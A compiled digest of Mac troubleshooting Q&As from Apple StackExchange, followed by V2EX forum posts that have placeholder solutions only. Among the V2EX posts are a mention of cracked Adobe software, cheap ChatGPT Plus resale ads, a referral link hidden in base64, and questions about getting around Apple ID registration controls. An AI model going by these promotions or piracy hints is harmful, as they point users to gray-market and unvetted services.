**参考链接 / References**:
- https://apple.stackexchange.com/questions/481162/terminals-prompting-for-login-and-not-starting-properly-anymore

---

#### 310. Extremely slow Terminal startup on macOS Sequoia (M3 Mac Pro)

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, terminal, performance, zsh | Score: 2 | Views: 1997 | Answers: 3 | Created: 2025-04-22

**解决方案 / Solution**:
I had the exact same issue after updating my macos to latest 15.5 version. Even ls in an empty directory was taking ~250 ms!
Anyway I was able to fix this by running:
sudo tccutil reset All

And then rebooting after fixed the slowness for me. This will reset system’s security policy cache which was corrupted after the OS upgrade for me. I looked at “Console” app that comes with the OS while i ran “ls” to check for errors, incase you were wondering how I got to this point. Absolutely killed my afternoon debugging this, hope it helps!

**参考链接 / References**:
- https://apple.stackexchange.com/questions/479649/extremely-slow-terminal-startup-on-macos-sequoia-m3-mac-pro

---

#### 311. Why is there a delay when using Automator to create a keyboard shortcut to open Terminal.app on macOS? Any faster alternatives?

**问题描述 / Problem Description**:
Tags: macos, terminal, applescript, automator | Score: 2 | Views: 350 | Answers: 2 | Created: 2024-11-26

**解决方案 / Solution**:
I have not used this tool, so I do not know if it will meet your needs: SRHD, Simple Rust Hotkey Daemon is a minimal and lightweight key binding service for MacOS similar to skhd. It is FOSS.
https://github.com/sylvanfranklin/srhd
I use rcmd, a paid app: https://lowtechguys.com/rcmd/. I hold the right CMD key and press I, and this launches iterm.
And I suspect you are aware of application launchers such as Alfred. While relatively quick, they do require more than just a keyboard shortcut.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/476993/why-is-there-a-delay-when-using-automator-to-create-a-keyboard-shortcut-to-open

---

#### 312. Is it possible to play Chess.app in macOS&#39;s Terminal without the graphical interface?

**问题描述 / Problem Description**:
Tags: terminal | Score: 2 | Views: 397 | Answers: 1 | Created: 2024-10-28

**解决方案 / Solution**:
Yes, but don't ask me how it works:
/System/Applications/Chess.app/Contents/Resources/sjeng.ChessEngine

Update: In the same folder as the engine are some data files that appear to be opening books and a sample configuration file. Those need to be copied to your home folder (I assume) in order to use them.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/476383/is-it-possible-to-play-chess-app-in-macoss-terminal-without-the-graphical-inter

---

#### 313. &quot;Command not found: mosh-server&quot; when trying to connect to macOS server running mosh

**问题描述 / Problem Description**:
Tags: macos, command-line, homebrew, ssh, open-source | Score: 2 | Views: 966 | Answers: 2 | Created: 2024-08-19

**解决方案 / Solution**:
For some reason, homebrew wasn't added to the path in non-interactive shells.
To fix it, run on the server:
echo 'export PATH=&quot;/opt/homebrew/bin:$PATH&quot;' &gt;&gt; ~/.zshenv 

or add the following to your ~/.zshenv:
# Homebrew path support
if command -v /opt/homebrew/bin/brew &gt;/dev/null 2&gt;&amp;1; then
  eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;
fi

Note: This assumes you have an ARM Mac (M1/M2/M3...). On Intel, you need to replace /opt/homebrew with /usr/local.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/474804/command-not-found-mosh-server-when-trying-to-connect-to-macos-server-running

---

#### 314. How to delete all tab groups at once in Safari

**问题描述 / Problem Description**:
Tags: macos, safari, tabs | Score: 1 | Views: 12 | Answers: 1 | Created: 2026-04-27

**解决方案 / Solution**:
No way to delete all tab groups at once via Safari UI. But tab groups are stored in the sqlite3 database under ~/Library/Containers/com.apple.Safari/Data/Library/Safari/SafariTabs.db. So removing that database will clear all tab groups.
Quit Safari, then open the Terminal.app:
# Backup database file to Desktop incase something goes wrong:
mv ~/Library/Containers/com.apple.Safari/Data/Library/Safari/SafariTabs.db ~/Desktop
# Delete related files (refer to Sqlite 3 documentation for details)
rm SafariTabs.db-shm SafariTabs.db-wal

Now re-run Safari and all tab groups including opened tabs from the last session are gone.
If you check the ~/Library/Containers/com.apple.Safari/Data/Library/Safari/ directory, you will find out that Safari will automatically create the SafariTabs.db file again.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486303/how-to-delete-all-tab-groups-at-once-in-safari

---

#### 315. Ken Burns screensaver effect maxing out CPU and GPU

**问题描述 / Problem Description**:
Tags: macos, performance, gpu, cpu, screensaver | Score: 1 | Views: 46 | Answers: 1 | Created: 2026-04-18

**解决方案 / Solution**:
So for anyone who finds this, the image resolution was the main factor. I batch resized them in Photoshop to a width of 3840 (many of them were rendered out in Blender at 7680) and the performance seems fine now - though it still leans heavily on the GPU it doesn't end up blurry. I suspect the resolution and quantity (74, but not all huge like that) was enough to do it.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486248/ken-burns-screensaver-effect-maxing-out-cpu-and-gpu

---

#### 316. MacBook Air M2 thermal throttling causes severe screen sharing lag in Teams and Zoom — any macOS-level fixes?

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, performance, cpu | Score: 1 | Views: 259 | Answers: 2 | Created: 2026-04-08

**解决方案 / Solution**:
Before starting the call, launch Activity Monitor and see whether any other processes are using a lot of energy. Quit them, if so.
Otherwise, use an external cooling device such as a thermoelectric cooling stand. Even a passive device that raises the bottom cover off the desktop so air can circulate may help.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486196/macbook-air-m2-thermal-throttling-causes-severe-screen-sharing-lag-in-teams-and

---

#### 317. Why is SSH failing on macOS 26.3?

**问题描述 / Problem Description**:
Tags: macos, ssh | Score: 1 | Views: 248 | Answers: 1 | Created: 2026-04-01

**解决方案 / Solution**:
The process gets hung up at the last line in the debug. Thinking that maybe that’s why SSH won’t launch, I removed the file and the directory and everything works. Even BBEdit.
sudo rm -Rf /var/run/com.apple.launchd.YUMtRKxnS6/Listeners

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486167/why-is-ssh-failing-on-macos-26-3

---

#### 318. How to auto-fit column width in Finder under Tahoe with scroll bars always on?

**问题描述 / Problem Description**:
Tags: macos, finder, tahoe | Score: 1 | Views: 99 | Answers: 1 | Created: 2026-03-14

**解决方案 / Solution**:
This is a bug/mess in macOS 26.  See this post from Jeff Johnson https://lapcatsoftware.com/articles/2026/2/4.html
The exact behaviour has changed with each minor version of macOS 26.  I am running macOS 26.3.1.  I am pretty sure that you are running an earlier version. With 26.3.1, I can double click on the target at the bottom of the scroll bar.  It is no longer hidden by the horizontal scroll bar.
The fix is for you (or your IT department) to update your Mac to 26.3.1.
Of course, this may change in the future as Apple tinker with the Liquid Glass interface.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486054/how-to-auto-fit-column-width-in-finder-under-tahoe-with-scroll-bars-always-on

---

#### 319. Why does my MacBook iMessage app keeps on getting out of sync with iMessage app on my iPhone?

**问题描述 / Problem Description**:
Tags: macbook-pro, data-synchronization | Score: 1 | Views: 50 | Answers: 1 | Created: 2026-03-07

**解决方案 / Solution**:
Check you are logged into iCloud on both devices. There is a Messages setting available in the iCloud settings on both OS that controls syncing.
Settings | iCloud | Messages | Use on this iPhone / Mac
This dialog will also show the sync status, and allow a manual sync
Information correct as per iOS 26.3.1 and macOS 26.3.1

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486006/why-does-my-macbook-imessage-app-keeps-on-getting-out-of-sync-with-imessage-app

---

#### 320. How does one create a new Calendar event using the cursor at the same time as an existing event?

**问题描述 / Problem Description**:
Tags: macos, calendar | Score: 1 | Views: 56 | Answers: 1 | Created: 2026-03-05

**解决方案 / Solution**:
Right click the existing event
Select Duplicate
Double-click on duplicated event and edit with next event info

**参考链接 / References**:
- https://apple.stackexchange.com/questions/485992/how-does-one-create-a-new-calendar-event-using-the-cursor-at-the-same-time-as-an

---

#### 321. Move iCloud Drive to External Drive

**问题描述 / Problem Description**:
Tags: macos, icloud, hard-drive, storage | Score: 1 | Views: 107 | Answers: 1 | Created: 2026-03-04

**解决方案 / Solution**:
iCloud is a syncing solution, putting on an external drive will lead to problems as soon as your Mac without it the first time.
What you can do instead:

Enable &quot;Optimize Mac Storage&quot; in System Settings -&gt; iCloud -&gt; iDrive. This will allow macOS to offload files in your iDrive to iCloud and only keep a stub on the disk itself. If you access such a file, it will be automatically get downloaded
Move the first 50 GB from your OneDrive to your iCloud Drive folder on the Mac and wait til it is fully synchronized to iCloud (may take a day or two, depending on network speed etc)
Open the iCloud Drive folder, right-click on folders you seldom need and select &quot;Remove Download&quot;. macOS does manage storage automatically, but this speeds up the process
Once enough disk space is available again, move the remaining data from OneDrive to your iCloud Drive folder (and may repeat the forced removal after the sync is done).

**参考链接 / References**:
- https://apple.stackexchange.com/questions/485980/move-icloud-drive-to-external-drive

---

#### 322. Why am I unable to enroll certain MacBooks in Apple Business Essentials? &quot;Enrollment failed. Please try again.&quot;

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, mdm, apple-business | Score: 1 | Views: 229 | Answers: 2 | Created: 2025-12-02

**解决方案 / Solution**:
If you released these devices from the organization (something that happens server side regardless of the state of the device), they are done and can not be managed again.

https://support.apple.com/guide/apple-business-manager/release-devices-axmec4d28461/web

I would contact Apple to determine the state of these few devices and then the appropriate steps to re-enroll or replace them with devices that can be managed under ABM.
They also can explain exactly which log file to look at on the OS in question (or read the server side logs if needed). Those devices that show their serial in your account are likely to be re-enrolled the next time they have to activate, so back up the data on the device, erase all content and settings, see the device get managed (or collect the error logs) and then restore the data once the device is managed and enrolled in the MDM.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/484291/why-am-i-unable-to-enroll-certain-macbooks-in-apple-business-essentials-enroll

---

#### 323. Fans run at 100%, cpu under clocked, even though temps are low

**问题描述 / Problem Description**:
Tags: macbook-pro, hardware, performance, temperature | Score: 1 | Views: 102 | Answers: 1 | Created: 2025-11-29

**解决方案 / Solution**:
After about 3 days, the palm rest sensor started working again, fans and CPU are back to normal. My best guess is that somehow the humidity and sand of my beach trip got into the trackpad. I hope apple improves the crappy design of this clamshell, which has no mesh on the bottom vents leading to a lot of dust buildup over time.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/484252/fans-run-at-100-cpu-under-clocked-even-though-temps-are-low

---

#### 324. Using external monitor only without consistent electricity

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, display, security, mdm | Score: 1 | Views: 93 | Answers: 2 | Created: 2025-11-04

**解决方案 / Solution**:
You are solving the wrong problem.
The Mac loses power, so it goes to sleep.
The power fluctuation you describe (1-5 times per hour) is bad for your Mac.  You should provide a UPS for the Mac that will cover these power issues.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/484019/using-external-monitor-only-without-consistent-electricity

---

#### 325. Are MacBook serial numbers paired to any internal hardware components?

**问题描述 / Problem Description**:
Tags: macbook-pro, hardware, serial-number | Score: 1 | Views: 218 | Answers: 1 | Created: 2025-11-03

**解决方案 / Solution**:
There are certainly a number of 2D barcodes identifiers found on the MacBook's logic boards and components as demonstrated by the examples below all gathered off the internet. Given the happenstance nature of spotting a barcode in these various contexts there was no means to corroborate these codes against the serial numbers of the units to verify a pairing. However at the least there could be a pairing since at least it has been established that these identifiers of some kind exist, the open question is whether they unique to the device. I scanned all the barcodes below that could be successfully scanned using screenshots scanned with a Zebra DS22 barcode scanner. (Note the next repair attempt I will scan my actual hardware to corroborate the numbers against the device's actual serial number and update this post with the findings of that experiment, the device is currently reassembled un unable to be photographed and scanned at this time.)
Logic Board
Here's an example of a 2D barcode showing up on the logic board PCB found on eBay.

The identifying text next to the code on a logic board reads as

C02220700
EA02K4 AW
OEO 3.5G 32G

The 2D barcode was scanned and decoded as J02220700&gt;A02T4A&lt;.
Wireless Module
Here's an example of a barcode printed on a Wireless Module witnessed in the following YouTube repair video.

My scanner read the code as 21031805010421120880083035, a 26 character number where the last 8 digits are also printed on chip packaging.

USI
339S00758
80083035

(Apparently this is a Apple USI 339S00758 – Wi-Fi 6/Bluetooth 5.0 module; see also
MacBook Pro network card)
Flash NAND Chips
Here's an example from a YouTube teardown video bringing into view some silver packaged Flash NAND chips used for the hard drive. There's other barcoded components visible on image as well, two of which my scanner was able to read, though the clarity was lacking I assume there's typos (Apple’s M3 MacBook Air Features Two NAND Flash Chips, Resulting In Faster SSD Speeds Compared To The Single Chip Used On The M2 Version)

**参考链接 / References**:
- https://apple.stackexchange.com/questions/484008/are-macbook-serial-numbers-paired-to-any-internal-hardware-components

---

#### 326. How to see which terminal programs are using the most energy?

**问题描述 / Problem Description**:
Tags: macos, terminal | Score: 1 | Views: 151 | Answers: 1 | Created: 2025-10-21

**解决方案 / Solution**:
Apple's Energy Impact is a poor measure for most situations. Prefer traditional underlying CPU and memory measurements, such as those seen in top and equivalent tools.
The Activity Monitor User Guide says:


Energy Impact: A relative measure of the current energy consumption of the app (lower is better).


This appears to be all Apple publish on the value.
Nicholas Nethercote's What does the OS X Activity Monitor’s “Energy Impact” actually measure? dives into the metric and how it might be derived:

So, in conclusion, on 10.10 and 10.11, the formula used to compute “Energy Impact” is machine model-specific, and includes the following factors: CPU usage, wakeup frequency, quality of service class usage, and disk, GPU, and network activity.

Unfortunately, it appears the original question can not be authoritatively answered by anyone outside of Apple.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/481908/how-to-see-which-terminal-programs-are-using-the-most-energy

---

#### 327. Apps won&#39;t get removed from dock and show as &quot;running in background&quot; since I updated to macOS 26

**问题描述 / Problem Description**:
Tags: macos, macbook-pro | Score: 1 | Views: 303 | Answers: 1 | Created: 2025-10-19

**解决方案 / Solution**:
Issue: MacOS 26.1 Beta bug
Fix: Updated to 26.1 Beta (25B5072a) and that fixed the bug!

**参考链接 / References**:
- https://apple.stackexchange.com/questions/481893/apps-wont-get-removed-from-dock-and-show-as-running-in-background-since-i-upd

---

#### 328. Clear output in macOS Terminal in Python script on Big Sur works, but not on Sequoia

**问题描述 / Problem Description**:
Tags: macos, terminal, python, alias | Score: 1 | Views: 190 | Answers: 2 | Created: 2025-10-14

**解决方案 / Solution**:
I use alias cls='tput clear' for the shell rather than depending on sending arbitrary control codes to the terminal.
In python, you would just use os.system('tput clear').

**参考链接 / References**:
- https://apple.stackexchange.com/questions/481844/clear-output-in-macos-terminal-in-python-script-on-big-sur-works-but-not-on-seq

---

#### 329. Error: Xcode alone is not sufficient on Ventura

**问题描述 / Problem Description**:
Tags: xcode, homebrew, ventura | Score: 1 | Views: 344 | Answers: 2 | Created: 2025-10-08

**解决方案 / Solution**:
You didn't do what the message said, you installed XCode instead, then deleted the CLT (Command Line Tools) instance instead of updating it.
Use xcode-select --install to reinstall the CLT, which is what Homebrew wants.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/481782/error-xcode-alone-is-not-sufficient-on-ventura

---

#### 330. How to tune &quot;optimized battery charging&quot; in macOS?

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, battery, charging | Score: 1 | Views: 326 | Answers: 1 | Created: 2025-09-15

**解决方案 / Solution**:
Put the Mac (or yourself) on a timer and cut off power 2 hours before the earliest wake time should feed a new schedule to tell your Mac finish charging earlier.
Or disable that feature if you decide it’s not worth retraining the algorithm with consistent earlier power state changes.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/481519/how-to-tune-optimized-battery-charging-in-macos

---

#### 331. [V2EX] 求助： mbp m1 合盖不熄屏

**问题描述 / Problem Description**:
1. 左上角休眠按钮被禁用2. 天才吧没看出什么问题，让我重装。测试硬件正常3. 新建账号问题依旧有没有遇到过的 v 友指点一下，如需什么细节我再提供

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208919#reply6

---

#### 332. [V2EX] Adobe Lightroom / BR 闪退/异常（Mac 版）

**问题描述 / Problem Description**:
我目前 2 台 MacBook Pro ， 旧的装的 BR 和 LR （ 2022 ）都是正常使用， 然而另一台新买的 安装 BR/LR 2024 ～ 2026 版都是各种 bug 或者闪退。
不知道什么原因？ 不知道怎么解决？
就算是从官方 ACC 下载的， 然后再用软件破解……最后还是有问题
哪位大佬能知道原因和解决办法？

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208903#reply4

---

#### 333. [V2EX] 第一个运行在苹果沙箱内的 OpenClaw 版本 CrabDesktop

**问题描述 / Problem Description**:
小龙虾🦞都过气了，我的龙虾 app 才过审，人生第一个 mac app ，缺乏审核经验。主打安全，运行在苹果沙箱内，原价 9.99$，现在优惠券免费使用，https://apps.apple.com/us/app/crabdesktop/id6760459522?mt=12 CrabDesktop 
J7N4A6RKPK7T 
6XTTTNWRYXEY 
W6FA3JW34NYA 
7339JLY6MEWX 
HWXX6MPNAK7J 
L4RW3F9LR4XA 
MFXRT6LMMRAJ 
MPY6YRJFPTXE 
TFNMMER9H994 
MNHRP3YXA76H

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1206213#reply17

---

#### 334. [V2EX] mac 上面有免费的 ftp 工具吗

**问题描述 / Problem Description**:
之前一直用的 scp

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1206113#reply14

---

#### 335. [V2EX] macos 五指捏合和四指捏合都会显示 spotlight，我不想让四指捏合显示

**问题描述 / Problem Description**:
最近用四指捏合经常误触显示 spotlight 。
原因是 macos 五指捏合和四指捏合都会显示 spotlight ，我不想让四指捏合显示
请问有办法吗

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1205918#reply4

---

#### 336. [V2EX] 预定 M5 pro 64G+1T 版本 macbook pro 的朋友都是等了多久拿到货的呀？

**问题描述 / Problem Description**:
3 月 21 在麦克先生那里预定了一台 14 寸 M5 pro 64G+1T 版本，当时说是大概 4-5 周发货。现在 5 周过去了还是没有消息。想问问大家买的同配置都是多久到货的？

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208802#reply21

---

#### 337. [V2EX] 推荐个 mac 的显示器吧？ 618 想搞一个

**问题描述 / Problem Description**:
2000 左右的

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208488#reply41

---

#### 338. [V2EX] 有更新了 ios18.7.8 的 V 友吗？

**问题描述 / Problem Description**:
说说续航发热怎么样，有没有什么 bug ？

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208379#reply8

---

#### 339. [V2EX] 看上了苹果店里展示 MacBook Neo 的那个垫子，哪里能买到？

**问题描述 / Problem Description**:
电脑一般般，但是那个垫子感觉真不错。

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208325#reply17

---

#### 340. [V2EX] 中国账号开始强制 iCloud 云贵

**问题描述 / Problem Description**:
注册或者切换国家为中国时必须同意云上贵州协议才可以之前可以单独改地区为中国，iCloud 是独立的，不同意不影响账号改区到中国，最多 iCloud 不可用

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208141#reply23

---

#### 341. [V2EX] Apple 地图规划出了“不存在”的线路

**问题描述 / Problem Description**:
今天上午 10 点南京 S2 地铁开通运营，目前高德地图已经可以正常显示，但是 Apple 地图存在了滞后的情况，但是路线规划已经可以规划出来，出现了比较罕见的未能在地图正常显示的路线的情况。之前有人争论 Apple 地图只是底图来自高德，算法是 Apple 自己的，现在这种情况就是可以充分证明导航算法其实也是来自高德的。

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1207688#reply9

---

#### 342. [V2EX] 请问现在 Apple ID 土区注册问题

**问题描述 / Problem Description**:
哪位佬有土区注册教程？发现现在注册 Apple ID ，国家选择土耳其，手机号是国内，不开代理注册，在输入图片验证码环节就提示当前无法创建，后面代理挂了 hk 和新加坡全局，但是走到完邮箱验证吗和最后手机验证码环节后也提示当前无法创建此账号，请问还有什么办法现在可以创建土区账号或者尼区账号呢？

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1207624#reply31

---

#### 343. [V2EX] 请问下，市面上那些卖苹果账号的，是怎么做的呢？

**问题描述 / Problem Description**:
如题，注册苹果账号不是需要绑定手机号吗，现在搞个手机号也麻烦，他们是怎么做到批量批发的？

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1207465#reply7

---

#### 344. [V2EX] 2026 年使用 邮箱 在 设置 中注册 任意地区 新 Apple ID 保姆级教程，解决注册风控问题

**问题描述 / Problem Description**:
前置准备

一台 iPhone 或 iPad
一个可用的电子邮箱（ Gmail 、Outlook 等）
一个可以接收短信或者接听电话的电话号码
⚠️ 注意：注册地区 = 当前装置的系统地区设定，请在注册前先确认装置地区是否正确


第一步：确认装置地区
前往 设置 → 通用 → 语言与地区 → 地区，语言无需修改，确认地区与你想注册的 Apple ID 地区一致。

例如：想注册美区 Apple ID ，请将装置地区设为「美国」，尼日利亚同理。


第二步：进入邮件账户设置（重要‼️）

打开设置 App
向下滚动，点击「邮件」
点击「账户」
点击「加入新账户」
在列表中选择「iCloud」


**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1207433#reply41

---

#### 345. [V2EX] 官网买的 Apple 礼品卡多久到账啊？

**问题描述 / Problem Description**:
昨天在官网用招行 visa 买了张 200 刀的礼品卡，已经 26 小时了还在 Processing 阶段。。。。。
大家都是多久收到的啊？

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1207398#reply48

---

#### 346. [V2EX] V2 魔怔人为什么这么多？

**问题描述 / Problem Description**:
今天有个热帖，讨论鸿蒙智行的，现已经到水深火热了，我不过就是在里面感叹一句，华为手机从当年使用火龙 888 ，到 2026 年目前为止出货量国内第一，就这都要被喷？是不是在 V 社说起华为，必须要喷华为才行，其他任何行为都是禁止的？是不是有点魔怔了？

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208960#reply11

---

#### 347. [V2EX] 偶然看到一篇文章《文化已死：当绝大多数人听的音乐，读的书都来自 10 年前》，给大家推荐一下，非常值得一看

**问题描述 / Problem Description**:
先说一下我的读后感，就是恍然大悟的感觉，当然，因为我已经奔 50 了，所以听的音乐大概是 2 、30 年前的。
看的书倒是大部分是新书，因为我经常是在 YouTube 上看到了感兴趣的书的介绍，然后再去看，最近看完的书《制度基因》是 25 年出版的。
文中最后一句：在这个宣称“文化自信”的国家，文化已经死了。振聋发聩，不知该作何感想。
原文地址： https://chinadigitaltimes.net/chinese/726807.html

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208941#reply2

---

#### 348. [V2EX] 66 个入狱教程

**问题描述 / Problem Description**:
时至今日，金句依然

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208876#reply1

---

#### 349. [V2EX] 国家超算互联网平台提供 Coding Plan(20 元/100 元两档)

**问题描述 / Problem Description**:
刚刚发现的,属于国家超算中心,由曙光信息运营, 套餐用量与阿里腾讯京东齐平,但是目前 5 折优惠中 
不足之处: 模型数量上不完整(MiniMax-M2.5 、Qwen3-235B-A22B, 其他接入中),可观望,也可先用着  
套餐地址:
https://www.scnet.cn/ui/console/index.html#/llm/coding-plan

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208813#reply14

---

#### 350. [V2EX] supergeo.info 送兑换码

**问题描述 / Problem Description**:
SuperGeo Starter 套餐兑换码
本次共发放 50 个 Starter 套餐，先到先得。
入口：https://supergeo.info
兑换码

SG-DCC5-XAVE-IJWQ
SG-6N77-CSTH-7NX7
SG-BYRK-BOQB-EPKT
SG-U6NS-BJXJ-OMCU
SG-BUR6-6PS0-EVL2
SG-TQWA-V7TV-BJY2
SG-HBJZ-R7RD-PDGS
SG-QAOY-368T-NTNV
SG-KXUY-W0MJ-RQBT
SG-QEZC-QA3Q-XJYB

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208796#reply3

---

#### 351. [V2EX] ChatGPT Plus 会员一个月 30 元 自助充值！

**问题描述 / Problem Description**:
ChatGPT Plus 会员 一个月 30 元自助充值
购买地址 https://abcnum.com/products/gptplus
随时断货 需要的速度购买

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208680#reply3

---

#### 352. [V2EX] 古风提示词

**问题描述 / Problem Description**:
生成一张富有诗意且视觉上层次丰富的诗歌解析海报。海报结构和风格要根据用户输入的诗句、名词或地点定制，确保
具有强烈的文学氛围和艺术感。
基本要求：


海报标题：海报上方使用霸气的手写体大字，字形优雅且充满气势。大字应为用户提供的诗句或与名词/地点相关的主题。字形应与海报的整体艺术风格协调，并且营造出强烈的视觉冲击。


文字排版：标题下方应有小字或小图形排版，包含相关的解析或引文，内容可以是对诗句的注释、相关背景的介绍或象征性字词的解释。小字的排版要有设计感，形成对比和节奏感，增强视觉层次。


知识点：将 5 至 10 个相关知识点融入海报设计。用户需要提供一个主题（如诗句、名词或地点），

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208653#reply0

---

#### 353. [V2EX] 飞机上 Starlink 测速

**问题描述 / Problem Description**:
比上一代飞机上的 Wi-Fi 快多了，基本上和地面没有使用上的区别。（除了飞机上不能使用视屏通话）

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208600#reply55

---

#### 354. [V2EX] GPT Image 2 韩文 prompt 实测：不是“能看懂”，而是“能还原”

**问题描述 / Problem Description**:
GPT Image 2 韩文提示词实测
这次测试 GPT Image 2 ，最明显的感受是：它对韩文 prompt 的理解不是简单翻译，而是真的能抓住细节。
测试用的韩文提示词是：

엄청 인형같은 얼굴의 K팝 여자 아이돌이 금색 여름 해변 의상을 입고 한국 잡지 표지 모델을 장식한 모습을 표현. 표지 문구에는 아이돌에 대한 소개 글이 들어가도록 표현. 아이돌의 이름은 여성스러운 이름으로 표현.


生成结果里，K-pop 女偶像、金色夏季服装、韩国杂志封面、介绍文字和女性化名字这些元素都能被准确呈现。尤其是“인형같은 얼굴”这种带审美倾向的描述，模型没有粗暴处理成普通

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208481#reply3

---

#### 355. [V2EX] 网页端 GPT-5.5 Thinking 体感好快啊，这速度第一反应还以为是降智到 4o-mini 了

**问题描述 / Problem Description**:
体感速度大概有 5 倍的提升，而且输出文字的速度也比 5.4 Thinking 快多了
之前用基本上都是问完后切别的窗口干别的事去了，现在可以等在这里，很快就回答完了
不清楚思考这么快，对能力是否有影响

与之前的不严谨对比（思考时间）
GPT-5.5 Thinking

GPT-5.4 Thinking

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208443#reply4

---

#### 356. [V2EX] 新开中转站，有 GPT 包月可以薅，分享给有缘人

**问题描述 / Problem Description**:
最近各种中转站由于 plus 、pro 渠道死了，codex 包月都转流量了，苦苦寻觅了一个新大佬开的中转站，特来分享给有缘人。openai gpt5.5,gpt-image-2 开通上线base64：aHR0cHM6Ly9jbi5jaHJvdXRlci5jb206ODQ0My9yZWdpc3Rlcj9hZ2VudF9jb2RlPWhqLTAwMDA4

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208442#reply6

---

#### 357. [V2EX] 小红书下场做 app 工厂

**问题描述 / Problem Description**:
圆周和 sigma 那几个每天都能刷到一群广告，还都挺直接的，这是内部转型还是说测试投放系统？代码不值钱了，大家都拼命卷了。

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208437#reply7

---

#### 358. [V2EX] 做了一个 GEO 工具平台，想听听大家对 AI 搜索优化的看法

**问题描述 / Problem Description**:
做了一个 GEO 工具平台，想听听大家对 AI 搜索优化的看法
最近一直在关注一个变化：越来越多问题，用户已经不是先去搜索引擎翻网页了，而是直接问 ChatGPT 、豆包、Kimi 、文心、Perplexity 这类 AI 工具。
传统 SEO 解决的是“我的页面能不能排在搜索结果前面”，但在 AI 搜索里，新的问题变成了：
我的内容能不能被 AI 理解？
能不能被它引用？
当用户问某个行业、产品或问题时，AI 给出的答案里会不会出现我的品牌、网站或内容？
我感觉 GEO ，也就是 Generative Engine Optimization ，应该会是一个比较确定的趋势。尤其是对内容站、独立

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208433#reply14

---

#### 359. [V2EX] XChat 正式上架 App Store 了

**问题描述 / Problem Description**:
有些失望，就是 X 的一个聊天 Tab 独立为 XChat 了，替代不了 TG ，也替代不了微信。

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208417#reply30

---

#### 360. [V2EX] 记一次 QQ 被盗事件记录

**问题描述 / Problem Description**:
QQ 被盗事件记录
基本信息

手机号码：1*********（中国联通）
设备：iPhone （最新系统，无越狱）
使用习惯：平时使用非中国大陆 eSIM ，联通号码通常不启用，需要时才临时开启
发现时间：2026/04/24 ，经朋友提醒才发现账号异常


背景说明

平时开着非中国大陆的 eSIM ，需要验证码时再临时启用联通号码
每次启用都会收到"已抵达 XXX"的漫游短信
漫游通常需要几分钟才有信号，有信号后收到的短信显示当前日期+时间，不一定是实时短信
iMessage 同步短信也需要先启用中国大陆手机号码才能接收


事件时间线
2026/03/19 — QQ 验证码异常（号码未

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208400#reply2

---

